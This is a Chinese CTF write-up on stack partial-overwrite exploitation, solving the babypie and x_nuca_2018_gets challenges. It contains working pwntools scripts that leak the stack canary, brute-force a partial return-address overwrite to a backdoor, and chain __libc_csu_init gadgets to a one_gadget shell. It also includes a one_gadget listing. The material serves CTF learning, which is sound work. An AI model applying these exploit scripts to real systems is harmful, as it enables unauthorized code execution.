# [花式栈溢出]栈上的 partial overwrite

希望能在这几天对Pwn中的栈上的各种利用和其他一些较小的分支做一个收尾，以便全力投入学习堆的相关知识。初步计划是对照ctf-wiki查缺补漏。

## 原理

以下内容摘自ctf-wiki

我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。

## babypie

保护全开

![image-20210411191232964](https://i.loli.net/2021/04/11/WRwhoc8nQGambeg.png)

第二个read存在非常明显的栈溢出

![image-20210411191144658](https://i.loli.net/2021/04/11/V9N6o4jGtJ7zrI5.png)

也给出了后门函数

![image-20210411191304494](https://i.loli.net/2021/04/11/fd1iyFZL4arTc8R.png)

为了使这个函数结束能返回到我们的后门函数，再用第二次read覆盖返回地址前，需要用第一个read和printf输出canary的值

可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 (**+ 1 是为了覆盖 canary 的最低位为非 0 的值, printf 使用 %s 时, 遇到 \0 结束, 覆盖 canary 低位为非 0 值时, canary 就可以被 printf 打印出来了**)

![image-20210411221116678](https://i.loli.net/2021/04/11/GK5bXvMOVlYQqAj.png)

现在需要控制返回地址到后门函数，我们先看本来的返回地址

![image-20210411221505678](https://i.loli.net/2021/04/11/kbAS6UcfC9HvRmn.png)

如图，我们的后门函数地址为0x555555554A3E，而程序本来的返回地址为0x555555554A23，这里巧合地只有8bit不同，但是普遍情况下，应该有低12bit~16bit不同。尽管可能最多有16bit不同，后门函数的低三位16进制数却总会是0xA3E，就算只有12bit不同，我们也不能只修改低12bit位0xA3E，因为payload发送以字节为单位，不能发送一个半字节，至少也得发送两字节。

总的来说，就是如果覆写低 16 bit 为 `0x?A3E`, 就有一定的几率 get shell，这里覆盖低16bit为0x0A3E

自动化爆破脚本如下，有时即使远端打成功了也会报错（不去深究了），重新打即可。

写脚本的时候也要**注意sendline和send的区别**，此题切莫用sendline，否则回车会覆盖关键位置

```
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
while True:
    p = remote('node3.buuoj.cn', 26235)
    p.recvuntil("Input your Name:\n")
    offset = 0x30 - 8 + 1
    payload1 = b'a' * offset
    p.send(payload1)  # not sendline!
    p.recvuntil('a' * (0x30 - 8 + 1))
    canary = '\0' + p.recv(7)
    p.recvuntil("\n")
    payload2 = 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\x3E\x0A'
    p.send(payload2)  # not sendline!
    p.recv(timeout=1)  # don't remove! or can only burp once
    try:
        p.recv(timeout=1)
    except:  # or except EOFError
        p.close()
        continue
    else:
        p.interactive()
        break
```

考虑此题的特殊性，其实确实也可以不需要覆盖两个字节，因为本来的返回地址和后门函数的地址应该是在同一页上并且偏移相差不大（可能是因为函数比较少的原因，这部分底层知识我还不是很清楚），所以覆盖一个字节（0x3e）就可以打通（正如调试所见，只有低8bits不同），不需要爆破。不过爆破肯定是更一般的做法。

```
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
p = remote('node3.buuoj.cn', 29528)
p.recvuntil("Input your Name:\n")
payload1 = b'a' * (0x30 - 8 + 1)
p.send(payload1)
p.recvuntil('a' * (0x30 - 8 + 1))
canary = u64(p.recv(7).rjust(8, '\0'))
print(hex(canary))
payload2 = b'a' * (0x30 - 8) + p64(canary) + b'aaaaaaaa' + p8(0x3e)
p.recvuntil("\n")
p.send(payload2)
p.interactive()
```

## 番外

做这题时，还想搞清楚python2里decode和encode的区别，也不知道到底搞清楚没

![image-20210411232903292](https://i.loli.net/2021/04/11/oUiWN3kHlEKtBuy.png)

如图，python2中decode("hex")将两个字符一起视作为十六进制，将'ff'decode后就是'\xff'，将'3738'decode后就是'\x37\x38'，也就是78，decode之后类型是字符串，u32/u64能对decode之后的字符串解包，也就是说能给u32/u64解包的是'\xff'这样的，而不是'ff'这样的

而，encode("hex")是将接收到的表示为十六进制的字节去掉'\x'，变成只有两个字符的字符串

![image-20210411233539353](https://i.loli.net/2021/04/11/nuVwqSLbzR5FZJ3.png)

另外，python中

rjust()返回一个原字符串**右对齐**,并使用指定字符填充至长度width的新字符串，如果指定的长度小于原字符串的长度则返回原字符串。str.rjust(width[, fillchar])

ljust()返回一个原字符串**左对齐**,并使用指定字符填充至长度width的新字符串，如果指定的长度小于原字符串的长度则返回原字符串。str.ljust(width[, fillchar])

## x_nuca_2018_gets（待解决）

**注：此题应在Ubuntu16.04下完成，在18.04下由于libc版本变化等各种原因，会导致某些相对偏移的变化**

```text
one-gadget是glibc里调用execve('/bin/sh', NULL, NULL)的一段非常有用的gadget。在我们能够控制ip的时候，用one-gadget来做RCE（远程代码执行）非常方便，一般地，此办法在64位上常用，却在32位的libc上会很难去找，也很难用。
```

先检查保护

![image-20210412190705373](https://i.loli.net/2021/04/12/zFr3Ch1fDBmeJ7R.png)

没有后门函数，没有'/bin/sh'，只有孤零零的gets

![image-20210412190914641](https://i.loli.net/2021/04/12/x7uXELoTJcAOtjq.png)

如果要拿到shell，必须跳转到libc里的execve

随便输入点什么东西，看看程序在ret指令时栈上的情况

栈上有两个返回地址，一个是0x7ffff7a03bf7(__libc_start_main+231)，在libc中，另一个是0x7ffff7de38d3(_dl_init+259)，一个比较自然的想法就是我们通过 partial overwrite 来修改这两个地址到某个获取 shell 的位置，那自然就是 Onegadget 了。那么我们究竟覆盖哪一个呢？

首先，partial overwrite针对的是低12bits，也就是说至少得修改一个半字节，由于payload发送以字节为单位，所以至少会修改两个字节，又因为gets会自动在读入的payload后面加上'\x00'，所以我们的**payload至少会修改三个字节**。

如果覆盖第一个返回地址，则函数执行完返回到0x7ffff700xxxx，这显然已经不在libc的范围内了，小于libc的基地址了，而libc前面也没有刻意执行的代码位置。更何况一般来说 libc_start_main 在 libc 中的偏移不会差的太多，如果覆盖这个地址，会让程序返回到一个不在libc中的地址。

如果覆盖第二个返回地址并把这个返回地址作为该函数执行完后返回的地址，则返回到0x7ffff700xxxx，libc位于 ld 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为\x00 的。举个例子，目前两者之间的偏移为0x7ffff7ffc000-0x7ffff79e2000=0x61a000，且经过多次实验发现在每次加载中，Id.so和libc.so的加载地址的相对位置是固定的，也就是偏移量不变，那么如果 ld 被加载到了 0x7ffff761a000，则显然 libc 的起始地址就是0x7ffff7000000。

证明见https://zhuanlan.zhihu.com/p/363113207

ctf-wiki接下来因不知libc版本，采取了随便覆盖，根据报错信息来判断的方法确定libc版本。这里因为buuctf上给出了ubuntu16的信息和libc版本，所以就直接下载下来了

使用one_gadget查看libc中gadgets的偏移

![image-20210412204613875](https://i.loli.net/2021/04/12/Bw3T7QYLRi9hVlW.png)

现在还不确定用哪个gadgets。

怎么才能覆盖并返回到栈中如此靠后的一个地址呢？

![image-20210412205053966](https://i.loli.net/2021/04/12/AfexNPa52nmRvw9.png)

用__libc_csu_init中的gadget，不断pop即可使esp最终指向该地址

本地能打通的exp（借鉴网络）：个人感觉并不正确，因为在跳转到one_gadget时并没有满足要求[rsp + 0x30] = 0，不知道为什么能打通

打了好久

![image-20210413015552239](https://i.loli.net/2021/04/13/t4f8QU5lhG2nd7C.png)

```
from pwn import *

# context.arch = 'amd64'
# context.log_level = 'debug'
# context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
offset = 0x18

while True:
    try:    
        p = process('./pwn')
        payload='a' * offset + p64(0x40059B)
        payload += 'b' * 8 * 5 + p64(0x40059B) + 'c' * 8 * 5 + p64(0x40059B)
        payload += 'c' * 8 * 5 + '\x26\x02'
        #gdb.attach(p)
        p.sendline(payload)
        p.sendline('ls')
        data = p.recv()
        print data
        p.interactive()
        p.close()
    except Exception:
        p.close()
        continue
```

自己写的exp，只是换了一个gadgets并使之严格满足gadgets的条件，但是不知道出了什么问题，本地和远程都有问题。

```
from pwn import *

# context.arch = 'amd64'
# context.log_level = 'debug'
# context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
offset = 0x18
while True:
    p = remote('node3.buuoj.cn', xxxxx)
    payload = 'a' * offset + p64(0x40059B)
    payload += 'b' * 8 * 5 + p64(0x40059B) + 'c' * 8 * 5 + p64(0x40059B)
    payload += 'c' * 8 + p64(0) + 'c' * 8 * 3 + '\xc8\x01' # p64(0)是为了使r12为0(NULL)
    p.sendline(payload)
    try:
        p.recv(timeout=1)
    except:
        p.close()
        continue
    else:
        p.interactive()
        break

"""
@ubuntu:~/Desktop/buuctf_Pwn$ one_gadget libc-2.23.so -l2
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xcd0f3	execve("/bin/sh", rcx, r12)
constraints:
  [rcx] == NULL || rcx == NULL
  [r12] == NULL || r12 == NULL

0xcd1c8	execve("/bin/sh", rax, r12)
constraints:
  [rax] == NULL || rax == NULL
  [r12] == NULL || r12 == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf02b0	execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0xf66f0	execve("/bin/sh", rcx, [rbp-0xf8])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL

"""

```

